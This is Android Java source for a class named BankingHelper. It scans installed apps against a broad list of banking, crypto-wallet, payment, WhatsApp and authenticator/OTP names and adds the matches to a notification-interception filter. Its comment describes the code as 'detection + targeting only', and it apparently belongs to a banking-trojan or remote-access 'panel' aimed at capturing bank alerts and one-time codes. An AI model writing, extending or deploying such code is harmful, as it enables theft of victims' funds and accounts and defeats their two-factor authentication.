package com.java.panel;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Banking / fintech / 2FA package awareness.
 * Detects installed financial apps and prioritizes their notifications.
 * Does NOT implement root-hiding or Magisk modules — detection + targeting only.
 */
public class BankingHelper {

    private static final Set<String> BANK_KEYWORDS = new HashSet<>(Arrays.asList(
            "bank", "banco", "caixa", "nubank", "itau", "bradesco", "santander",
            "bb.com", "inter", "c6bank", "picpay", "mercadopago", "paypal",
            "binance", "coinbase", "crypto", "wallet", "finance", "credit",
            "visa", "mastercard", "pix", "openbank", "revolut", "n26",
            "chase", "wellsfargo", "bankofamerica", "citibank", "hsbc",
            "barclays", "lloyds", "ing", "deutsche", "unicredit",
            "sbi", "hdfc", "icici", "paytm", "phonepe", "gpay", "google.android.apps.nbu",
            "com.google.android.apps.walletnfcrel", "com.whatsapp", // payments
            "auth", "token", "otp", "2fa", "authenticator", "rsa", "symantec"
    ));

    private static final String[] KNOWN_BANK_PACKAGES = {
            "com.nu.production", "com.itau", "br.com.bradesco", "com.santander.app",
            "com.bancointer", "com.c6bank.app", "com.picpay", "com.mercadopago.wallet",
            "com.paypal.android.p2pmobile", "com.binance.dev", "com.coinbase.android",
            "com.google.android.apps.authenticator2", "com.azure.authenticator",
            "com.authy.authy", "com.whatsapp", "com.whatsapp.w4b",
            "com.phonepe.app", "net.one97.paytm", "com.google.android.apps.nbu.paisa.user"
    };

    public static String listBankingApps(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            List<String> found = new ArrayList<>();

            Set<String> known = new HashSet<>(Arrays.asList(KNOWN_BANK_PACKAGES));

            for (ApplicationInfo ai : apps) {
                String pkg = ai.packageName.toLowerCase();
                String label = "";
                try {
                    label = pm.getApplicationLabel(ai).toString().toLowerCase();
                } catch (Exception ignored) {}

                boolean match = known.contains(ai.packageName);
                if (!match) {
                    for (String kw : BANK_KEYWORDS) {
                        if (pkg.contains(kw) || label.contains(kw)) {
                            match = true;
                            break;
                        }
                    }
                }
                if (match) {
                    String name;
                    try {
                        name = pm.getApplicationLabel(ai).toString();
                    } catch (Exception e) {
                        name = ai.packageName;
                    }
                    found.add(name + " (" + ai.packageName + ")");
                }
            }

            if (found.isEmpty()) return "🏦 No banking/fintech/2FA apps detected.";
            StringBuilder sb = new StringBuilder();
            sb.append("🏦 Banking / Fintech / 2FA apps (").append(found.size()).append("):\n\n");
            for (String s : found) sb.append("• ").append(s).append("\n");
            return sb.toString();
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    /** Register detected bank packages into notification live filter */
    public static String prioritizeBanks(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            int added = 0;
            Set<String> known = new HashSet<>(Arrays.asList(KNOWN_BANK_PACKAGES));
            for (ApplicationInfo ai : apps) {
                String pkg = ai.packageName.toLowerCase();
                boolean match = known.contains(ai.packageName);
                if (!match) {
                    for (String kw : BANK_KEYWORDS) {
                        if (pkg.contains(kw)) {
                            match = true;
                            break;
                        }
                    }
                }
                if (match) {
                    NotificationHelper.addFilter(ai.packageName);
                    added++;
                }
            }
            return "✅ Prioritized " + added + " banking/2FA packages in notification filter.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }
}
